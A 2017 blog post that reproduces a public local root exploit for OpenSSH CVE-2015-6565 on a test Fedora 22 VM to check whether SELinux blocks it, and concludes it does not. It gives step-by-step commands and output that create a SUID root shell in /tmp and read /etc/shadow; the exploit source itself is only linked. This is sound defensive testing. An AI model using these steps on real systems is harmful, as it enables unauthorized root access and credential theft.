+++
date = "2017-02-02T09:46:27+09:00"
title = "OpenSSH vulnerability (CVE-2015-6565) PoC with SELinux"

+++

We found there was information about PoC to get local priveledge with
CVE-2015-6565(vulnerability for OpenSSH), then we want to make sure can we
protect it by using SELinux or not.

(Written by Kazuki Omo:ka-omo@sios.com).
  

* * *

## Reference

#### <http://www.openwall.com/lists/oss-security/2017/01/26/2>

## Prepare for PoC

Here is a description how to reproduce it. **I used Fedora22-VMWare Guest
because this vulnerability is for OpenSSH 6.8-6.9. Also I assigned only 1 CPU
to that guest.**

  1. Install Fedora22 with OpenSSH-enabled / enabled gcc and those dev tool. Because this is for PoC I didn't update Fedora22(everything package versions are same as DVD).

The openssh version is 6.8p1-5 ;

    
        [root@localhost ~]# rpm -qa|grep -i openssh
        openssh-6.8p1-5.fc22.x86_64
        openssh-server-6.8p1-5.fc22.x86_64
        openssh-clients-6.8p1-5.fc22.x86_64
    

  2. Put PoC code which you can see on [the referenced page.](http://www.openwall.com/lists/oss-security/2017/01/26/2)

  3. Compile that code on PoC Fedora22;
    
        [jsossug@localhost ~]$  gcc not_an_sshnuke.c -o not_an_sshnuke
    

* * *

## PoC

Now it's ready for PoC.

  1. Run the code with normal user account;
    
        [jsossug@localhost ~]$ ./not_an_sshnuke /dev/pts/3
    

  2. Run the code with normal user account;
    
        [jsossug@localhost ~]$ ./not_an_sshnuke /dev/pts/3
        [*] Waiting for slave device /dev/pts/3
    
    

  3. Open 2 terminals and ssh to the PoC machine in each terminal with normal user account;
    
        [jsossug@extest ~]$ ssh -l jsossug 172.16.148.139
        jsossug@172.16.148.139's password: 
        Last login: Sun Jan 29 14:06:21 2017 from 172.16.148.1
        [jsossug@localhost ~]$ 
    
    
        [jsossug@extest ~]$ ssh -l jsossug 172.16.148.139
        jsossug@172.16.148.139's password: 
        Last login: Sun Jan 29 14:06:21 2017 from 172.16.148.1
        [jsossug@localhost ~]$ 
    

  4. Open another terminal and ssh to the PoC machine with **root** account. If ;
    
        [jsossug@extest ~]$ ssh -l root 172.16.148.139
        root@172.16.148.139's password: 
        Last login: Sun Jan 29 14:06:37 2017 from 172.16.148.1
        [root@localhost ~]# 
    

  5. On the first terminal, you can see following results;
    
        [jsossug@localhost src]$ ./not_an_sshnuke /dev/pts/3
        [*] Waiting for slave device /dev/pts/3
        [+] Got PTY slave /dev/pts/3
        [+] Making PTY slave the controlling terminal
        [+] SUID shell at /tmp/sh
    

  6. Just want to make sure /tmp/sh attribute;
    
        [root@localhost ~]# ls -lZ /tmp/sh
        -rwsr-xr-x. 1 root root unconfined_u:object_r:user_tmp_t:s0 1084536 Feb  2 01:31 /tmp/sh
    

  7. Then run /tmp/sh on first terminal with following option;
    
        [jsossug@localhost src]$ /tmp/sh --norc --noprofile -p
    

  8. Now we got "euid=0";
    
        sh-4.3# id
        uid=1000(jsossug) gid=1000(jsossug) euid=0(root) groups=1000(jsossug),10(wheel) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
        sh-4.3# cat /etc/shadow
        bin:*:16489:0:99999:7:::
        daemon:*:16489:0:99999:7:::
        adm:*:16489:0:99999:7:::
        lp:*:16489:0:99999:7:::
    

  9. SELinux is "Enabled";
    
        sh-4.3# getenforce
        Enforcing
    

* * *

## PoC with "updated SELinux"

So, we found normal(non-upgraded) SELinux Policy on Fedora22 can't protect
tihs vulnerability.

Then now we wonder how about "updated SELinux Policy".

  1. Update SELinux Policy;
    
        [root@localhost ~]# dnf -y update selinux-policy-targeted
        Fedora 22 - x86_64 - Updates                    2.2 MB/s |  23 MB     00:10    
        Last metadata expiration check performed 0:00:13 ago on Wed Feb  1 04:46:43 2017.
        Dependencies resolved.
        ================================================================================
         Package                    Arch      Version                  Repository  Size
        ================================================================================
        Upgrading:
         selinux-policy             noarch    3.13.1-128.28.fc22       updates    428 k
         selinux-policy-targeted    noarch    3.13.1-128.28.fc22       updates    4.1 M
        
        Transaction Summary
        ================================================================================
        Upgrade  2 Packages
        
        Total download size: 4.5 M
        Downloading Packages:
          (1/2): selinux-policy-3.13.1-128.28.fc22.noarch 1.6 MB/s | 428 kB     00:00    
          (2/2): selinux-policy-targeted-3.13.1-128.28.fc 998 kB/s | 4.1 MB     00:04    
        --------------------------------------------------------------------------------
        Total                                           825 kB/s | 4.5 MB     00:05     
        Running transaction check
        Transaction check succeeded.
        Running transaction test
        Transaction test succeeded.
        Running transaction
          Upgrading   : selinux-policy-3.13.1-128.28.fc22.noarch                    1/4 
          Upgrading   : selinux-policy-targeted-3.13.1-128.28.fc22.noarch           2/4 
          Cleanup     : selinux-policy-targeted-3.13.1-122.fc22.noarch              3/4 
          Cleanup     : selinux-policy-3.13.1-122.fc22.noarch                       4/4 
          Verifying   : selinux-policy-targeted-3.13.1-128.28.fc22.noarch           1/4 
          Verifying   : selinux-policy-3.13.1-128.28.fc22.noarch                    2/4 
          Verifying   : selinux-policy-3.13.1-122.fc22.noarch                       3/4 
          Verifying   : selinux-policy-targeted-3.13.1-122.fc22.noarch              4/4 
        
        Upgraded:
          selinux-policy.noarch 3.13.1-128.28.fc22                                      
          selinux-policy-targeted.noarch 3.13.1-128.28.fc22                             
        
        Complete!
        [root@localhost ~]# getenforce
        Enforcing
       

  2. We continue to that PoC with updated SELinux Policy again;
    
        [jsossug@localhost src]$ ./not_an_sshnuke /dev/pts/3
        [*] Waiting for slave device /dev/pts/3
        [+] Got PTY slave /dev/pts/3
        [+] Making PTY slave the controlling terminal
        [+] SUID shell at /tmp/sh
    

  3. Just want to make sure /tmp/sh attribute;
    
        [root@localhost ~]# ls -lZ /tmp/sh
        -rwsr-xr-x. 1 root root unconfined_u:object_r:user_tmp_t:s0 1084536 Feb  2 01:47 /tmp/sh
    

  4. Run /tmp/sh with updated SELinux Policy;
    
        [jsossug@localhost src]$ /tmp/sh --norc --noprofile -p
        sh-4.3# id
        uid=1000(jsossug) gid=1000(jsossug) euid=0(root) groups=1000(jsossug),10(wheel) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
        sh-4.3# cat /etc/shadow
        bin:*:16489:0:99999:7:::
        daemon:*:16489:0:99999:7:::
        adm:*:16489:0:99999:7:::
        lp:*:16489:0:99999:7:::
        sh-4.3# exit
        exit
        [jsossug@localhost src]$ getenforce
        Enforcing
    

  5. Just we want to make sure SELinux Policy is updated;
    
        [jsossug@localhost src]$ rpm -qa|grep -i selinux-policy
        selinux-policy-3.13.1-128.28.fc22.noarch
        selinux-policy-targeted-3.13.1-128.28.fc22.noarch
    

It seems that even if we update SELinux Policy, we can't mitigate this
vulnerability(CVE-2015-6565).

* * *

## Conclusion

Now we could see that CVE-2015-6565 PoC is successfull even if SELinux is
enforcing. The main reason is because that vulnerability is using TIOCSTI +
ioctl.

This seems to be close to [CVE-2016-7545(can escape SELinux sandboxing). In
that vulnerability, we could fix it by updating
policycoreutils.](https://www.spinics.net/lists/selinux/msg20112.html)

Probably we can modify SELinux policy and could be mitigate this
vulnerability. We will continue to check it.

Also we couldn't reproduce it on Fedora25+openssh6.8p1.

